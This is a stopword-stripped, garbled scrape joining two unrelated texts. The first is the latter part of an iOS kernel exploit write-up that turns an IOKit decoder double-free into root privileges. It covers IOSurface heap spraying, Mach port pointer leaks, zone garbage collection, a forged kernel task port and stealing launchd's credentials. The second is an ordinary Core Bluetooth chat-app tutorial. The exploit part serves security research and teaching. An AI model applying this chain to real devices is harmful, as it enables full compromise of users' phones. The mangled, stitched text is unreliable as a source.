null nextsprev listheadprev next kernmeminfo nextsprev next prev nextsprev prev iofree return retvalue free byte chunk seen line tmpbuf memory region previously copied user struct tmpbuf point byte chunk free unlinking chunk double linked list executed however chunk pointer never deleted user client neither happen function would expected function called destroydecoder subsequent call therefore check line never true possible free chunk multiple time verified creating small proofofconcept program call destroydecoder twice row done shown next section discus exploit bug detail exploitation section discus exploit bug shown previous section triggering bug exploitability bug discussed trigger built method table reviewed order find createdecoder destroydecoder called following excerpt show entry two method table smethods ioexternalmethoddispatch ff ff ff addr createdecoder functio ff ff ff checkscalarinputcount checkstructureinputsize checkscalaroutputcount checkstructureoutputsize ioexternalmethoddispatch ff ff ff addr destroydecoder function ff ff ff checkscalarinputcount checkstructureinputsize checkscalaroutputcount checkstructureoutputsize two different kind argument passed external method iokit driver one kind scalar argument ie normal argument like integer one structure argument exact definition structure reverse engineered however size structure given checkstructureinputsize checkstructureoutputsize dynamic length argument possible would indicated value bit high respective field different way call external method checkstructureinputsize checkstructureoutputsize nonzero value method table createdecoder detroydecoder suitable use ioconnectcallstructmethod passing scalar argument struct argument full function prototype ioconnectcallstructmethod follows kernreturnt ioconnectcallstructmethod machportt connection selector const void inputstruct sizet inputstructcnt void outputstruct sizet outputstructcnt selector index method method table hence createdecoder destroydecoder inputstruct outputstruct pointer structs allocated user space copied kernel space user client inputstructcnt outputstructcnt equal size value defined method table dynamic length needed would indicated size method table size argument set actual size struct user space remaining argument connection external method call performed process establish connection iokit driver respectively user client without going much internal detail iokit every iokit driver inherits ioservice ioservices registered creation allows query moreover ioservice create user client connection internally represented socalled mach port macos io specific ipc mechanism discussed later article connection establishment implemented function ioserviceopen ioservice found via mentioned registry implementation process found eg file finished exploit published article understanding use ioconnectcallstructmethod reverse engineered input struct filled createdecoder destroydecoder first suspicious call createdecoder value offset input struct passed allocatekernelmemoryinternal via allocatememory passed along virtual method call method fails error message logged viewed via dmesg jailbroken device allocatekernelmemory kallocmaptypeiosurface lookupsurface failed apparently value id iosurface frame buffer object shareable process iosurface created first implemented another ioservice called iosurfaceroot similarly method table user client found reviewed first iosurfacerootuserclient smethoddescs aa ioexternalmethoddispatch ff ff ff ff ff ff aa addr iosurfacerootuserclient screatesurface function ff ff ff checkscalarinputcount ff ff ff ff ffffffffh checkstructureinputsize checkscalaroutputcount checkstructureoutputsize seen screatesurface first external method create iosurface similar createdecoder called struct argument first dynamic length output count fixed input screatesurface function dictionary xml format dictionary contains detail frame buffer allocated however enough provide key iosurfaceallocsize value therefore enough give following string dict key iosurfaceallocsize key integer integer dict output struct contains id iosurface id used field value input struct createdecoder createdecoder called needed call destroydecoder twice done similarly content input struct irrelevant used test trigger exploit code shipped article may used done modify exploit function exploitm call triggerbug call triggerfree crash io primitive turned useafterfree vulnerability subsequently privilege escalation shown next section exploitation bug analysed previous section section discus possible exploitation path general idea turn doublefree useafterfree condition leverage condition order obtain arbitrary memory write primitive ultimate goal exploit create kernel task port mach task port allow full access respective mach task access kernel task port hence provides convenient mean perform arbitrary modification patching kernel code order create kernel task port several thing required way read kernel memory address required kernel task port faked way trick kernel using userprovided data task port best achieved useafterfree setting involving mach port turning doublefree issue useafterfree required kalloc zone spraying via iosurface object order find way turn doublefree useafterfree vulnerability worthwhile take quick glance dynamic memory management io kernel io macos implement zone allocator similar one freebsd general zone associated struct defined kernel allocation zone therefore fixed size example zone called ipcports allocate struct ipcport object used implement mach ipc mechanism mentioned last section struct allocated allocator first look memory page already associated zone page still unallocated space big enough hold struct one chunk page allocated pointer chunk returned page full whole new page allocated exclusively given zone detail mechanism could found presentation stefan esser eg hitb presentation special case anonymous allocation done iomalloc note iomalloc used allocatememory function called createdecoder several zone named kallocx x power anonymous allocation allocator take zone smallest chunk size fit requested allocation case discussed vulnerability byte allocated hence allocation chunk zone allocation exploit vulnerability therefore must come zone exploit discussed article achieves way similar one discussed ian writeup modification first memory spray technique used discussed already mentioned presentation stefan esser expanded adam donenfeld exploit named ziva iosurface object introduced previous section interesting feature possible associate property iosurface consist osdictionary object osdictionary object keyvalue store value object eg osnumber osdata object interesting part feature property given kernel space remember iosurface object created kernel space special ioservice xml format parsed internally function osunserializexml data ie binary data associated key dictionary osdata object allocated come handy osdata object internally allocate space stored data one anonymous kallocx zone hence byte binary data associated key data osdata object stored associating multiple osdata object property iosurface possible spray zone eventually allocate chunk previously freed call destroydecoder property set via external method ssetvalue iosurfaceroot user client selector method want dynamical length input struct content follow specific scheme must reverse engineered reviewed following code excerpt setvalue called ssetvalue iosurfacerootuserclient setvalue iosurfacevalueargs unsigned int iosurfacevalueresultargs ulonglong setvalue iosurfacerootuserclient void structureinput uint inputsize void structureoutput uint surfaceid osobject unserializedobj osarray array osobject value osobject key osstring keystring ulonglong ret iosurfaceclient surfaceclient ret surfaceid uint structureinput iolocklock lock surfaceid uint nsurfaces surfaceclient iosurfaceclientarray surfaceid int surfaceclient surfaceclient iosurfaceclient unserializedobj osunserializexml char longlong structureinput int structureinput inputsize int char longlong structureinput osstring unserializedobj osobject array osarray safemetacast osmetaclassbase unserializedobj osmetaclass gmetaclass array osarray value osobject code array vtable osarray getobject key osobject code array vtable osarray getobject key osobject keystring osstring else keystring osstring safemetacast osmetaclassbase key osmetaclass gmetaclass value osobject key osobject keystring osstring setvalue surfaceclient keystring uint value structureoutput surfaceid int surfaceclient surfaceid ret ulonglong surfaceid first id parsed read line value actual property encoding located offset shown line call osunserializexml occurs line show osarray expected could deduced following gmetaclass pointer point meta class osarray osarray found two virtual method call occur line reversed like shown previous section way found osarray getobject called twice second value osstring first one osobject instance known property osdictionary object could assumed osstring key object actual data following call setvalue line could confirmed spray therefore following encode property consists array osdata object contains byte zero lead enough allocation one osdata object allocates freed chunk destroydecoder small catch read stefan presentation data encoded luckily exploit actually written objectivec method easily conversion normal cstring one reverse engineering setvalue known input struct constructed following way iosurface id array array data data time data data array string key string array calling ssetvalue via ioconnectcallstructmethod eventually allocate byte chunk implemented function spraykernelheapwithzeroes accompanied exploit creating information leak spray could achieved actually much point freed byte chunk using destroydecoder reallocated chunk using heap spraying approach ultimate goal obtaining access kernel task port requires information leakage primitive fake kernel task port built containing correct kernel pointer end iosurface property another interesting feature using external method sgetvalue called via selector property iosurface object could read userspace possible leak interesting value chunk could read exploit process exactly done next remember currently two pointer chunk one decoder one property sprayed one free chunk calling destroydecoder via function triggerfree lead crash chunk allocated albeit allocation happened performing heap spray two pointer decoder property point free byte chunk whatever data stored chunk future read using sgetvalue could leaked chunk technique often used past used current point leak pointer struct ipcport object port ipc mechanism already mentioned several time article aim get much mechanism however port feature come handy io exploitation one feature every socalled mach message sent port associated type describes content message one type called machmsgoolportsdescriptor allows send port process via another port case data message consists array port name sent saved variable type machportt port allocated allows exploit feature via achieved information leak following property every port name contained message data converted pointer struct ipcport port array pointer stored kallocx zone smallest chunk fit array pointer hence port sent chunk allocated port pointer pointer byte big system sending lot mach message one message allocate freed byte chunk simply using sgetvalue outlined allows read kernel pointer struct ipcport port exploit process sends moreover message received port machmsgoolportsdescriptor message sent stay portinternal message queue long case byte chunk stay allocated containing port pointer increase chance allocate target byte chunk zone sprayed via sending message spray implemented function oolportsdescriptorspray exploit different original exploit described ian writeup exploit code actually leak three port pointer function leakportpointer two pointer two port associated exploit process called targetport owntaskport another one point host name port last one special port owned process four port set machportnull internally represented null pointer reason leak described later article create exploitable useafterfree condition leak targetport would already sufficient described remainder section three port pointer contained byte chunk could read using sgetvalue iosurface object sgetvalue called like external method similar ssetvalue first byte input struct contain iosurface id offset follows key property osdata object allocated containing zero easy identify pointer using memmem like original exploit output struct search implemented function searchforpointerleak later creating fake kernel task port information obtained via leak required dangling port pointer next step exploit turn vulnerability useafterfree condition mach port allow tricking kernel treating userprovided data mach port turn enable exploit craft fake kernel task port leveraging information leak destroydecoder called one last time via triggerfree iosurface property trick used function explains usage machportnull important destroydecoder attempt unlink chunk doublelinked list important prev next set null well pointer beginning chunk latter important otherwise deallocatekernelmemoryinternal called eventually destroydecoder would try call virtual method time data string property contains three leaked port pointer pointer port saved targetport stored twice osdata object though remainder byte filled zero order understand achieve useafterfree condition mach port following observation important machmsgoolportsdescriptor message sent eventually ipcrightcopyin called function increase reference counter every port contained message via call ipreference kernreturnt ipcrightcopyin ipcspacet space machportt name ipcentryt entry machmsgtypenamet msgtname booleant deadok ipcobjectt objectp ipcportt sorightp case machmsgtypecopysend port ipsrights ipreference port ipunlock port port destroyed via user space function machportdestroy queued message port destroyed well case machmsgoolportsdescriptor message ipcobjectdestroy called every port static unsigned int ipckmsgcleaninvaliddesc void ipckmsgcleanbody unused ipckmsgt kmsg machmsgtypenumbert number machmsgdescriptort saddr case machmsgoolportsdescriptor destroy port right carried message j j dsc count j ipcobjectt object object j iovalid object continue ipcobjectdestroy object dsc disposition ipcobjectdestroy finally release reference port via call iprelease mean reference counter message increased every machmsgoolportsdescriptor sent spray decreased message contained byte chunk destruction port reference targetport every process reference allocated port port table every message spray via machmsgoolportsdescriptor message mean destroying receiving port lead free targetport reference counter decreased port table still contains dangling reference port though therefore still used eventually doublefree chunk turned useafterfree vulnerability involving port zone garbage collection dangling port pointer useful io exploit try achieve typically turn controlled port socalled kernel task port due capability port kernel task port allows write read memory anywhere kernel user space eventually used get root right exploit process fulfill aim exploit developer find writeprimitive attackercontrolled port exploit draw another wellestablished technique trigger zone garbage collection ipcports zone garbage collection context memory kernel zone something different maybe known reader managed programming language io mean following page associated memory zone completely empty chunk freed stay associated zone hence new chunk would allocated page completely new page associated zone however io mechanism called garbage collection would deassociate empty page zone memorypressure ie lot new chunk allocated via zone allocator reviewed function zallocinternal following line taken iszonemapnearingexhaustion threadwakeup eventt vmpageoutgarbagecollect iszonemapnearingexhaustion test zone memory allocator pressure booleant iszonemapnearingexhaustion void size zonemap size capacity vmmapmax zonemap vmmapmin zonemap size capacity zonemapjetsamlimit return true return false size line memory amount currently allocated zone capacity hand line memory amount available allocation zone allocator ifclause line test size available capacity case following function eventually called due threadwakeup void vmpageoutgarbagecollect int collect collect iszonemapnearingexhaustion woken zone allocator zonemapexhaustion jetsam bail calling zonegc trigger zonemapexhaustion jetsam fall subsequent operation clear bunch cache might allocate zone memory eg vmmap operation would need vm map entry since zone map almost full point could end panic need quickly jetsam process exit could happen woken relieve memory pressure zone map also happened near limit time case skip early ok memory pressure persists thread simply woken considerzonegc true considerzonegc call eventually call zonegc turn call dropfreeelements zone latter function go page associated zone drop available reallocation therefore idea following page ipcports hold struct ipcport object targetport completely empty garbage collection allow reallocation particular page next reallocation via method allows writing kernel page give enough opportunity order get control struct ipcport two method already described article better option hence two condition must fulfilled trigger zone garbage collection must targetport freed using primitive described previous section also primitive put zone memory allocator pressure first condition fulfilled applying kind feng page containing targetport filled struct ipcport object belong exploit process possible free port targetport freed achieved allocating big array port called beforeports exploit code fill hole page already associated zone ipcports hopefully lead allocation fresh page zone filled beforeports next targetport allocated followed another port array called afterports containing port latter necessary remainder page containing targetport port beforeports still free could filled port process way complete page filled targetport port beforeports afterports deallocating targetport via primitive destroying port beforeports afterports leave whole page empty moreover exploit probably filled lot page port one containing targetport probability page filled port process low next method trigger garbage collection needed ian beer described method used original exploit method used exploit described function derived ben aka ibsparkes machswap exploit like possible send port via mach message another port also possible send bigger chunk memory via mach message implemented ooldescriptorspray message type machmsgooldescriptor sending machmsgooldescriptor message sending byte data mb allocated substraction byte necessary machmsgooldescriptor message copy header front actual data seen following struct definition struct vmmapcopy int type vmobjectoffsett offset vmmapsizet size union struct vmmapheader hdr entrylist vmobjectt object object kdata kernelbuffer cu due struct alignment first three field consist byte size cukdata beginning actual data message one trace code function actually copy message data kernel space eventually find call vmmapcopyinkernelbuffer static kernreturnt vmmapcopyinkernelbuffer vmmapt srcmap vmmapoffsett srcaddr vmmapsizet len booleant srcdestroy vmmapcopyt copyresult kernreturnt kr vmmapcopyt copy vmsizet kallocsize kallocsize vmsizet cpykdatahdrsz len copy vmmapcopyt kalloc kallocsize function called data size small enough ie smaller kb copy type defined message body copy field machmsgphysicalcopy copy message data already copied kernel space special area memory map used exclusively physically copied data machmsgooldescriptor message line show kalloc called kallocsize byte kallocsize len size data message plus cpykdatahdrsz cpykdatahdrsz defined offset cukdata field struct vmmapcopy seen file vmmaph xnu kernel ie mentioned byte mb memory available iphone trigger garbage collection reliable similar machmsgoolportsdescriptor message memory queue machmsgooldescriptor message allocated anonymous zone due kalloc call hence case monitor garbage collection executed time needed send one machmsgooldescriptor message measured length one millisecond clearly show occured garbage collection afterwards port used trigger garbage collection destroyed order free allocated chunk hence page containing dangling port targetport associated zone next subsection describe used escalate privilege root controlling targetport garbage collection page containing port targetport associated zone however page free must allocated gain control targetport moreover actual page containing targetport must identified probably much allocated garbage collection done function using machmsgooldescriptor message however time sent message contains individual magic value specific offset port field associated struct ipcport object called ipcontext offset value retrieved via function machportgetcontext user space hence ipcontext field overwritten unique value page identifiable calling function original exploit little complicated ipcontext value every port page overwritten however offset port page known previous port pointer leak via iosurface object example port pointer end offset port page would page byte size ipcontext field targetport therefore following offset port offset page ipcontext offset vmmapcopy header subtraction necessary due byte header copied message data explained previous section exploit loop executed sends one machmsgooldescriptor message time via unique port array called sprayports set ipcontext value loop counter resp index sprayports array message sent ipcontext value targetport retrieved via machportgetcontext port sprayports used send specific machmsgooldescriptor message overwritten ipcontext value targetport simply calculated via ipcontext port sprayports directly destroyed freeing page machmsgooldescriptor message dropped aim get control struct ipcport structure via pipe done function controlportviapipe reason pipe enable write page without freeing new write happen possible pipe use buffer cache data written pipe read pipe buffer allocated function pipespace static int pipespace struct pipe cpipe int size vmoffsett buffer size return einval buffer vmoffsett kalloc size return enomem size taken following array static const unsigned int pipesizeblocks pipesize pipesize initially byte allocated buffer increased needed writing byte pipe buffer therefore increased byte reading byte writing new content preserve buffer size sometimes another page freed free page containing targetport happened pipe write occurs hence exploit creates one pipe writes byte identifying pipe overwritten ipcontext magic value trick technique give reliable control field next subsection discus used turn targetport kernel task port used elevate privilege process left exercise reader implement way directly control targetport via pipe without detour using machmsgooldescriptor message creating kernel task port complete control targetport needed create fake kernel task port via function createkerneltaskport exploit code use different technique traverse couple kernel structs necessary information collected finally kernel task port forged exploit relies port pointer leak offset kernel structs fixed io version direct kaslr bypass required read information wellknown arbitrary read technique used leverage function pidfortask like name suggests function read pid given task port ie port belongs exploit process done reviewed following code excerpt kernreturnt pidfortask struct pidfortaskargs args machportnamet args useraddrt pidaddr args pid proct p taskt portnametotaskinspect tasknull err kernfailure goto pftout else p getbsdtaskinfo p pid procpid p err kernsuccess else iscorpsetask pid taskpid err kernsuccess else err kernfailure void copyout char pid pidaddr sizeof int first struct task pointer given port targetport read line done reading kobject pointer struct ipcport targetport next getbsdtaskinfo return bsdinfo pointer line fact pointer struct proc field pid pid process last procpid read pid given bsdinfo bsdinfo pointer pid finally copied user space line however perfect read primitive read bit kernel space targetport completely controlled kobject point anywhere exploit chosen use unused part page contains targetport big enough hold struct task object hence struct task completely controlled setting bsdinfo arbitrary kernel space address minus offset pid struct proc io content address read via procpid copied user space two consecutive read allow read bit value using primitive allows read necessary information forge kernel task port first ipreceiver field former leaked host port read ipreceiver point struct store ipc message received host port host port special port type share coincidence ipreceiver kernel task port necessary field read memory map stored field vmmap kernel task struct read actual kernel task object achieve several structs traversed second task port owntaskport pointer leaked come play first ipreceiver field port read ipreceiver point struct ipcspace object contains pointer task associated process like task object type struct task contains field bsdinfo point struct proc object process ie actual object store information exploit process struct proc linked list beginning contains pointer former created process traversing pointer lead eventually struct proc process recognized pid value struct proc contains pointer kernel task object vmmap field read copied fake kernel task port needed create forged kernel task port used read write arbitrary location memory implemented via function kernelread kernelwrite used elevate privilege last step elevate privilege last bit exploit piece cake elevateprivileges call patchcredentials traverse process list time pid stored struct proc object read pid exploit process pointer struct proc saved pid launchd init process io hence pid ucred field read ucred pointer struct cred object hold information process like uid user running process also mac label latter defines capability process overwriting ucred field struct proc object exploit process ucred field value launchd exploit gain capability launchd le process running full rootprivileges hence possible call setuid gain process running root conclusion step exploit could improved many way first full jailbreak would need work eg order circumvent mandatory code signing apps moreover sandbox exploit used need sign install app turn exploit exploit another sandbox escape eg safari needed furthermore exploit pretty unstable least iphone run sucessfully around reason partly many free dangling pointer reallocation another process happen eventually crash system least dangling pointer certainly lead crash app closed also least detour using machmsgooldescriptor instead pipe directly allocating page factor could improved easily original threat exploited user space process mediaserverd first break sandbox crash stop long iphone dangling pointer problem would associated process would interesting know reliable original exploit code feedback make exploit reliable general welcome mitigation modern version io least garbage collection technique work anymore io reason new mitigation called zonerequire basically check address port mapped zone ipcports another one like technique overwrite port certain value order forge kernel task port work nevertheless better writeprimitive needed though mitigation like smap bypassing would need work however point full kernel privilege escalation exploit developed scratch lot knowledge scattered many article presentation many already developed technique many part io could researched perspective hoped article establish kind starting point io exploit developer novice acknowledgement lot publicly available information significantly eased development exploit particular order ian great writeup adam ziva good introduction ben took inspiration machswap siguza sandbox escape came right time stefan presentation clarified helped many thing luca marco great inspiration well forgotten someone many greets chat
37,Lobsters,ios,Apple iOS,Getting Started with Core Bluetooth,https://ditto.live/blog/posts/getting-started-with-core-bluetooth,getting started core bluetooth,table content introduction core bluetooth basic concept core bluetooth central peripheral service public database exists characteristic core bluetooth concept summary putting practice getting started scanning central online uuid generator advertising peripheral detecting peripheral central received signal strength indicator connecting peripheral discovering characteristic inside peripheral service subscribing characteristic confirming notification peripheral set sending data peripheral sending data central receiving data peripheral receiving data central summary challenge chat app technical reflection limited message size speed limitation additional speed penalty reliable delivery different level control per platform securityprivacy policy backgrounded apps extremely complex api work demand bulletproof error checking handling occasional instability general odd behavior lack encryption conclusion,table content introduction really hard overstate much smartphones tablet transformed world starting iphone device combine gorgeous intuitive touch interface full suite network technology io developer consider stranger networking almost breadandbutter requirement every app day kind rest api handle encoding decoding data remote source side technology aside another huge side networking smartphone never personally explored bluetooth yet sitting writing post wearing wireless headphone apple watch strapped wrist played animal crossing nintendo switch wireless pro controller feel like bluetooth something take granted black box magic never worry daytoday life io engineering career never involved project need side project learn bluetooth apis apple provides buddy max asked interested writing app order demonstrate core bluetooth work following blog post experience jumped chance blog post geared anyone else boat someone might necessarily newbie developing apple platform never stopped learn core bluetooth apis work discus core concept behind core bluetooth parentchild architecture show send basic data device discus pitfall encountered core bluetooth core bluetooth apple public framework official way third party apps integrate bluetooth functionality apps io ipados point core bluetooth abstraction bluetooth low energy ble different classic bluetooth allowing far energy efficient communication support lowpowered device historically meant core bluetooth aimed low powered peripheral device heart rate sensor home automation kind device primarily reside low power state periodically broadcast small tidbit information contrast device using classic bluetooth like game controller wireless headphone much high powered constantly streaming data previously impossible access third party apps however io apple expanded core bluetooth cover classic bluetooth device well public api changed mean much wider variety wireless device became available amazing capability never better time start learning adopt core bluetooth basic concept core bluetooth working core bluetooth necessary become accustomed specific terminology major component service relate central peripheral ble operates traditional serverclient sort model one device act capacity server contains information another act client query information processesdisplays locally device broadcast advertisement called peripheral device scan connect peripheral called central connected usually peripheral act server central act client way core bluetooth operates general example pairing pair bluetooth headphone smartphone smartphone would central headphone would peripheral service obviously type ble device question determine sort capability example heart rate monitor record wearer heart rate smart thermostat would record current temperature location apps built support one specific class device capability example apps tracking user health would interest connecting device nt health related thermostat order encapsulate report capability specific peripheral bluetooth requires peripheral identify class capability service peripheral make discoverable central broadcasting advertisement packet defining main identifying service offer central scanning time detects packet determines peripheral device found support class service searching begin process connecting traditionally main service device advertised connection formed central query peripheral additional service offer order central determine compatible peripheral need know id value service peripheral support specific apps peripheral device make sense define service using shared uuid device however general practice make sense peripheral adopt bluetooth service standard capability globally example would make sense device record blood pressure reading could connected bluetooth device capable processing data regardless manufactured either device public database exists list standardized set service id used central peripheral want adopt specific use case characteristic given service number separate set information andor service might included within example heart rate sensor peripheral might feature heart rate service contained within service raw current heart rate value along information sensor positioned wearer time service may contain number characteristic record various type data perform various subfunctions service may used receive data peripheral send command back peripheral possible central explicitly query information characteristic register observer called every time characteristic update concept bluetooth device offering capability service characteristic officially called gatt short generic attribute profile core bluetooth concept summary hopefully point basic layout core bluetooth starting make sense parent device called central connect child device known peripheral peripheral manage capability service manage capability via characteristic putting practice discussed basic concept core bluetooth start putting practice demonstrating flow connecting two device built companion sample app around core bluetooth app basic chat app allows two device connect send message app demonstrates scan central advertise peripheral connected app send message upstream downstream one pipeline getting started starter anything else need add nsbluetoothalwaysusagedescription key app infoplist describing want use bluetooth key nt present would app rejected app store submission app throw exception trying call core bluetooth apis security requirement apple apps must get explicit permission user bluetooth enabled case let explain need bluetooth enable chat service access bluetooth allows chat others device place start using core bluetooth swift every source file integrates framework must following import statement import corebluetooth scanning central io device fill role central bluetooth connection represented object called cbcentralmanager begin let create new instance let centralmanager cbcentralmanager delegate self queue nil see object must designated delegate upon instantiation object must conform cbcentralmanagerdelegate upon instantiation central manager necessary activity needed start using bluetooth started immediately point ca nt start scanning yet bluetooth spends nontrivial amount time setting state could considered powered immediately must wait first delegate callback func centralmanagerdidupdatestate central cbcentralmanager guard centralstate poweredon else return centralmanagerdidupdatestate called every time state bluetooth system change include status bluetooth resetting access unauthorised reason productionready app every single state properly handled however case need detect state bluetooth reached powered happened start scanning scanning peripheral easy need call scanforperipherals specify service interested let service cbuuid string centralmanagerscanforperipherals withservices service option nil centralmanagerscanforperipherals withservices service option nil mentioned service carry unique identifier peripheral central may match core bluetooth identification handled via cbuuid object specific case use simple string identifier tutorial using uuid string value generated online uuid generator value need globally unique recognizable peripheral central side point device scanning peripheral matching service identifier point central checked scanning calling centralmanagerisscanning advertising peripheral central scanning need another device acting peripheral advertise service scanning similar central managed via cbcentralmanager peripheral managed instance cbperipheralmanager let peripheralmanager cbperipheralmanager delegate self queue nil exactly central manager peripheral manager require delegate upon creation time conforming cbperipheralmanagerdelegate also must wait state bluetooth device reach powered func peripheralmanagerdidupdatestate peripheral cbperipheralmanager guard peripheralstate poweredon else return state bluetooth peripheral powered peripheral start advertising let characteristicid cbuuid string let characteristic cbmutablecharacteristic type characteristicid property write notify value nil permission writeable let serviceid cbuuid string let service cbmutableservice type serviceid primary true servicecharacteristics characteristic peripheralmanageradd service peripheralmanagerstartadvertising cbadvertisementdataserviceuuidskey service cbadvertisementdatalocalnamekey device information fair bit unpack step one part time nothing complicated create characteristic assign standardised characteristic uuid central expecting also need explicitly mark characteristic writable central send data back peripheral create service object standardised service uuid set type primary ensure advertised main service peripheral advertise peripheral service uuid addition cbadvertisementdatalocalnamekey key normally hold device name peripheral modified hold additional data central could potentially use eg current temperature thermostat detecting peripheral central one device scanning one advertising service id able detect central side peripheral detected following delegate callback called func centralmanager centralmanager cbcentralmanager diddiscover peripheral cbperipheral advertisementdata string rssi rssi nsnumber centralmanagerconnect peripheral option nil selfperipheral peripheral diddiscoverperipheral provide lot interesting information peripheral advertisementdata dictionary contain information like device name manufacturer name addition service uuids defined cbadvertisementdataserviceuuidskey though may discover later necessary possible check peripheral support service central want checking value advertisementdata cbadvertisementdataserviceuuidskey addition rssi value received signal strength indicator useful determining distance peripheral sometimes may necessary require specific proximity proper functioning value used monitor happy peripheral one want connect call centralmanagerconnect begin connecting time since way access peripheral object outside delegate also good idea retain local property class connecting peripheral discovered peripheral called centralmanagerconnect central attempt connect following delegate method called func centralmanager centralmanager cbcentralmanager didconnect peripheral cbperipheral centralmanagerstopscan peripheraldelegate self let service cbuuid string peripheraldiscoverservices service point become responsible peripheral instead acting central manager object work directly peripheral object peripheral object type cbperipheral distinctly different cbperipheralmanager first thing assign delegate peripheral conforming cbperipheraldelegate receive event directly done call discoverservices peripheral let u confirm service support subsequently access service characteristic need discovering characteristic inside peripheral service set delegate peripheral performed request discover service following method cbperipheraldelegate called func peripheral peripheral cbperipheral diddiscoverservices error error let error error print unable discover service errorlocalizeddescription cleanup return let characteristic cbuuid peripheralservices foreach service peripheraldiscovercharacteristics characteristic service error occurs point must handle exit gracefully otherwise peripheral object populated service support like service identified via cbuuid object characteristic identified way subscribe characteristic start reading data contains must also discover member service addition peripheral multiple service becomes necessary iterate one discover one characteristic interested iterate service peripheralservices attempt discover characteristic want via id subscribing characteristic chat app interested passive stream data peripheral want notified immediately new data come need configure peripheral alert u whenever characteristic updated characteristic service discovered following delegate callback called func peripheral peripheral cbperipheral diddiscovercharacteristicsfor service cbservice error error let error error print unable discover characteristic errorlocalizeddescription cleanup return let characteristicuuid cbuuid servicecharacteristics foreach characteristic guard characteristicuuid characteristicuuid else return peripheralsetnotifyvalue true characteristic selfcharacteristic characteristic anything failed process first appropriate error handling moving secondly received service object since service number characteristic inside must loop discover main one want discovered characteristic want call peripheralsetnotifyvalue true order start getting notified data change confirming notification peripheral set one final step process peripheral report whether setting characteristic notify central successful whether succeeded failed following delegate triggered func peripheral peripheral cbperipheral didupdatenotificationstatefor characteristic cbcharacteristic error error let error error print characteristic update notification error errorlocalizeddescription return guard characteristicuuid characteristicuuid else return characteristicisnotifying print characteristic notification begun else print characteristic notification stopped disconnecting centralmanagercancelperipheralconnection peripheral nt think explicitly required implement method subscription failed would make sense detect attempt subscribe perform cleanup code needed point additionally central data pending would like send peripheral would best place send sending data peripheral central manager successfully able capture peripheral relevant characteristic central start sending data peripheral via characteristic one thing note characteristic must explicitly configured peripheral side writable central point possible send data peripheral calling let data messagestringdata using peripheralwritevalue data characteristic type withresponse type argument let specify whether want peripheral reply received data great discerning type data might explicitly required certain order data often repeated peripheral nt catch nothing value lost sending data central opposite side sending data central peripheral side similar method let data messagestringdata using peripheralmanagerupdatevalue data characteristic onsubscribedcentrals central receiving data peripheral finally ready start receiving data peripheral order notified new data arrived characteristic use following delegate func peripheral peripheral cbperipheral didupdatevaluefor characteristic cbcharacteristic error error let error error print characteristic value update failed errorlocalizeddescription return guard let data characteristicvalue else return let message string decoding data receiving data central last peripheral receives data central following method cbperipheralmanager called func peripheralmanager peripheral cbperipheralmanager didreceivewrite request cbattrequest guard let request requestsfirst let data requestvalue else return let message string decoding data one thing extra aware characteristic set writeable time creation sending data peripheral silently fail delegate never called summary going step obvious sending data core bluetooth involves quite step peripheral side peripheral configure advertise service characteristic manage central subscribe unsubscribe central side subscribing characteristic multistep process scanning peripheral connecting peripheral discovering peripheral service discovering service characteristic finally subscribing however said understand terminology object chain related next everything fall place relatively easily challenge chat app introduction core bluetooth api show general basic step connecting central peripheral writing chat app rather large hurdle appeared immediately central peripheral classic use case low powered sensor connected iphone role central peripheral clear cut however connection two iphones question play role suddenly becomes much harder decision one neat thing might obvious start core bluetooth make device central peripheral time meaning simultaneously scanning advertising device opened app device discovery screen create central manager peripheral manager begin scanning advertising time device range thing way device device detects shown onscreen likewise device detect device show device screen device discovery screen interested detecting available device could potentially chat go chat session window want receive message remote device selected case user tap device want talk hardware uuid selected device saved chat window opened holding copy uuid device opened chat window device set scan like standard central connection wo nt occur yet avoid detecting device advertising device discovery menu different service uuid used connection device performing scanning continues happen first time either participant chat submits message chat happens particular device becomes peripheral start advertising happens device detects first device connects central essence whoever chat first becomes peripheral whoever chat last remains central together sharing single connection advertisement saved hardware uuid used determine identity connecting device guarantee someone else different session happened start broadcasting nt accidentally join instead overall method might seem bit strange pragmatic level might make sense set maintain two connection device central connected another peripheral however practice unreliable two connection could potentially fail interference occurs technical reflection discussed core bluetooth api design pattern easy understand work said looked bare minimum getting core bluetooth moving would absolutely sufficient production app folk ditto use core bluetooth flagship product extension bluetooth low energy android support addition challenge limitation experienced project challenge ditto engineer faced well limited message size one thing completely glossed amount data sent characteristic hard limit limit change device historically byte modern phone hardware around byte chat app payload small per message nt much concern certainly something production app need take seriously core bluetooth capable detecting reporting acceptable length message device want send responsibility code chunk data send multiple message speed limitation maximum speed communicating via gatt actually kilobyte per second chat app limitation would never bump heavier application could quickly become bottleneck depending use case might optimize message payload efficient additional speed penalty reliable delivery writing data characteristic specifying withresponse attribute guaranteeing peripheral confirm received data roundhouse operation also incurs additional speed penalty use case require absolute top speed usually best rely unreliable delivery instead implement error correction logic different level control per platform core bluetooth instigates specific policy may apply equivalent ble implementation device android big example limitation core bluetooth imposes much sort data included advertising packet peripheral building product might equivalent android counterpart care must taken ensure interface behave way securityprivacy policy backgrounded apps regular bluetooth stack io function regardless onscreen activity apple implemented strict privacy policy apps adopting ble peripheral device app backgrounded continue advertise local name property longer included additionally backgrounded central longer receive repeating advertisement peripheral range particular limitation big point contention organization trying build contact tracing apps top core bluetooth extremely complex api work certainly becomes easier work time core bluetooth certainly nt easy framework get running quickly order start sending receiving data long process step need followed order slowly capture object need compounding step done via callback one another one time sometimes even one delegate daisychains new delegate case cbperipheral working process needed use case timeconsuming require high cognitive load demand bulletproof error checking handling point delegate callback process error could easily happen derail whole process wireless technology bluetooth prone interference randomly losing device delegate code need bulletproof error handling every step order handle issue potentially occur step process also potentially mean proactive heartbeat state check case expected callback fails occur occasional instability general odd behavior even though core bluetooth quite old point still occasional odd behavior happen quite reliably sometimes sending queue filled capacity callback say cleared sometimes skipped requires periodically testing queue see state certain specific device like ipad mini iphone potentially accidentally stop scanning locked unlocked lack encryption given form data transmitted bluetooth could quite private personal eg person health record encryption always strongly recommended form ble encryption exists reliable implementation might need consider writing encryption layer error correcting implication would entail conclusion first got chat app working text typed one phone automatically appeared felt absolutely magical fantastic time learning core bluetooth order write post hope found everything useful end one thing certainly clear implementing core bluetooth implementation hard involves lot step lot go wrong point user experience engineer researching core bluetooth looking build new product implement sort local communication instead rolling new implementation scratch recommend consider checking synchronization technology ditto ditto tech stack already taken care challenge listed would make integrating communication app breeze thanks reading sample app github repository
